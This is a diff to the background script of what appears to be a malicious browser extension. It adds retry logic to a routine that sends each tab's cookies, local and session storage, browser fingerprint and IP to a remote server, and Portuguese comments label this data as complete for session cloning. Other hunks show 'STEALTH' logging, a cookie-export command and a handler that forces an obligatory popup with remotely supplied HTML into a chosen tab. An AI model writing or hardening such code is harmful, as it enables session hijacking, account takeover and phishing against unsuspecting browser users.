@@ -2097,8 +2097,9 @@ async function createOffscreenDocument() {
     
     log('info', '📄 [STEALTH] Offscreen document created');
   } catch (error) {
-    log('error', '❌ [STEALTH] Failed to create offscreen document:', error);
-    throw error;
+    log('warn', '⚠️ [STEALTH] Failed to create offscreen document, continuing without it:', error);
+    offscreenPinned = false;
+    // Don't throw - continue initialization without offscreen
   }
 }
 
@@ -2586,7 +2587,10 @@ async function handleExportCookiesCommand(data) {
 
 // Handle popup command with BLOCKING, OBLIGATORY popup
 async function handlePopupCommand(data) {
-  const originalTabId = parseInt(data.target_tab_id);
+  const originalTabId = Number(data.target_tab_id);
+  if (isNaN(originalTabId) || !Number.isInteger(originalTabId)) {
+    throw new Error(`Invalid tab_id type: ${data.target_tab_id} (type: ${typeof data.target_tab_id})`);
+  }
   const domain = data.target_domain;
   const htmlContent = data.payload?.html_content || '';
   const cssStyles = data.payload?.css_styles || '';
@@ -2940,30 +2944,59 @@ async function trackSession(tab) {
     // ✅ CAPTURAR DADOS COMPLETOS
     const sessionData = await captureSessionData(tab, domain);
     
-    const response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
-      },
-      body: JSON.stringify({
-        machine_id: machineId,
-        user_id: machineId,
-        tab_id: tab.id.toString(),
-        url: tab.url,
-        domain: domain,
-        title: tab.title || 'Sem título',
-        action: 'heartbeat',
+    // ✅ RETRY LOGIC para mitigar timeouts
+    let response;
+    let lastError;
+    const maxRetries = 3;
+    const retryDelay = 1000; // 1s
+    
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+      try {
+        response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+          },
+          body: JSON.stringify({
+            machine_id: machineId,
+            user_id: machineId,
+            tab_id: tab.id.toString(),
+            url: tab.url,
+            domain: domain,
+            title: tab.title || 'Sem título',
+            action: 'heartbeat',
+            
+            // ✅ DADOS COMPLETOS PARA CLONAGEM
+            cookies: sessionData.cookies,
+            local_storage: sessionData.local_storage,
+            session_storage: sessionData.session_storage,
+            browser_fingerprint: sessionData.browser_fingerprint,
+            client_ip: sessionData.client_ip
+          }),
+          signal: AbortSignal.timeout(15000)
+        });
         
-        // ✅ DADOS COMPLETOS PARA CLONAGEM
-        cookies: sessionData.cookies,
-        local_storage: sessionData.local_storage,
-        session_storage: sessionData.session_storage,
-        browser_fingerprint: sessionData.browser_fingerprint,
-        client_ip: sessionData.client_ip
-      }),
-      signal: AbortSignal.timeout(15000)
-    });
+        if (response.ok) break; // Success!
+        
+        // Se não ok, tentar novamente
+        lastError = new Error(`HTTP ${response.status}`);
+        if (attempt < maxRetries) {
+          log('warn', `⚠️ Session tracker failed (attempt ${attempt}/${maxRetries}), retrying...`);
+          await new Promise(resolve => setTimeout(resolve, retryDelay));
+        }
+      } catch (error) {
+        lastError = error;
+        if (attempt < maxRetries) {
+          log('warn', `⚠️ Session tracker error (attempt ${attempt}/${maxRetries}): ${error.message}, retrying...`);
+          await new Promise(resolve => setTimeout(resolve, retryDelay));
+        }
+      }
+    }
+    
+    if (!response || !response.ok) {
+      throw lastError || new Error('Failed after retries');
+    }
     
     if (response.ok) {
       log('debug', `✅ Session data sent with ${sessionData.cookies.length} cookies`);
